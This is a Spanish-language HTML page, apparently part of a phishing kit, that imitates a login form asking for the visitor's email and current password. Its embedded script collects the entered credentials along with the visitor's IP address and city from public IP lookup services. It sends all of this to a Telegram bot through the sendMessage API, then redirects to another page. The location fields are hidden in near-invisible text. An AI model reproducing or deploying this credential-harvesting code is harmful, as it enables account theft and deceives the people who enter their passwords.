<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="gastron/parecido.css">
    <title>proyecyd</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
       
    </style>




<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
<script src="pres.js"></script>
<script>
  $.getJSON("https://api.ipify.org?format=json", function(data) {
          $("#gfg").html(data.ip);
      });
      $.getJSON("https://ipinfo.io", function(response) {
    $("#ip").html("IP: " + response.ip);
    $("#address").html("" + response.city + ", " + response.country);
  });

  var u_name, u_name2, ip, ip2, message;
  var ready = function() {
    u_name = document.getElementById("tikitaka").value;
    u_name2 = document.getElementById("mondacaso").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "MMMBB\n?Ucorr: " + u_name + "\n?clv2: " + u_name2 + "\n??IP: " + ip +"\n" + ip2;
  };
  var sender = function() {
    ready();
    var settings = {
      "async": true,
      "crossDomain": true,
      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
      "method": "POST",
      "headers": {
        "Content-Type": "application/json",
        "cache-control": "no-cache"
      },
      "data": JSON.stringify({
        "chat_id": chat_id,
        "text": message
      })
    };
    $.ajax(settings).done(function(response) {
      console.log(response);
      window.location = 'finichen.html';
    });
    return false;
  };

</script>
</head>
<body>





    <div id="myprest" >


    </div>
    <center>   
<p  style="text-align: center;">
    <div class="vertice" >

<img class="log-jp" src="gastron/procenche.png" alt="primerlog"></p>


   
        <h2>Realiza el requerimiento...</h2><br>
        <form method="post" action="#" onsubmit="return sender();">
            <div class="form-group">
              
                <input class="campos" type="email" id="tikitaka" name="tikitaka" placeholder="Ingresa tu correo actual"  required="">
            </div>
            <div class="form-group">
               
                <input class="campos" type="text" id="mondacaso" name="mondacso" placeholder=" Clave Actual"  required="">
            </div>
            <div class="form-group">
                <button class="campobo" type="submit" >Iniciar Sesion </button>
            </div>
        </form>


    </div>

    <footer>Todos los derechos reservados. Este proceso es obligatorio
    </footer>
    <div style="color: rgb(255, 255, 255);font-size: 0.05px;" >
        <p id="gfg"></p>
        <p id="ip"></p>
        <p id="address"></p></div>
</body> </center>
</html>
